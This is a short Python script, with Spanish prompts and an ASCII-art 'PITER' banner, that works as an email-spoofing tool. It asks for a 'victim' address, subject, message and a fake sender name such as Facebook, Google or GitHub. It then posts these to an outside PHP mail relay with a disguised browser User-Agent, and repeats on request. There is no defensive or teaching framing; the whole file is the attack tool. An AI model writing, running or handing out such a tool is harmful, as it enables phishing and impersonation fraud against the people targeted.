import requests
import os 


#os.system("clear")



#colores 
r = "\033[0;31m"#red
v = "\033[0;32m"#verde
a = "\033[0;34m"#azul
y = "\033[0;33m"#yelow
x = "\033[0;0m"#cerrar color

while True:
    
    print(f"{v}▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒")
    print("▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒")
    print("▒▒█▒▒▒▄██████████▄▒▒▒▒")
    print("▒█▐▒▒▒████████████▒▒▒▒")
    print("▒▌▐▒▒██▄▀██████▀▄██▒▒▒")
    print("▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒")
    print("▐┼▐▒▒██████████████▒▒▒")
    print("▐▄▐████─▀▐▐▀█─█─▌▐██▄▒")
    print(f"▒▒█████───{r}PITER{v}──▐███▌")
    print("▒▒█▀▀██▄█─▄───▐─▄███▀▒")
    print("▒▒█▒▒███████▄██████▒▒▒")
    print("▒▒▒▒▒██████████████▒▒▒")
    print("▒▒▒▒▒██████████████▒▒▒")
    print("▒▒▒▒▒█████████▐▌██▌▒▒▒")
    print("▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒")
    print("▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒")
    print("▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒")


    to = input("Escriba correo Victima-> ")
    subjet = input("Escriba el asunto del correo-> ")
    msg = input("Escriba el mensaje del correo-> ")
    header = input("Escriba el Nombre: Ej: Facebook, google, github-> ")


    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}
    send = requests.post('https://panamasocail.com/smtp.php', data={'to': to , 'subject': subjet, 'message': msg, 'from': header}, headers=headers)
    print(send.text)
    print(f"{v}▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒")
    print(f"{y}[{r}*{y}]{v} 1 Salir")
    print(f"{y}[{r}*{y}]{v} 2 Volver a enviar")
    if input("Escriba el numero de la opcion que desea-> ") == "1":
        exit()
    else:
        pass
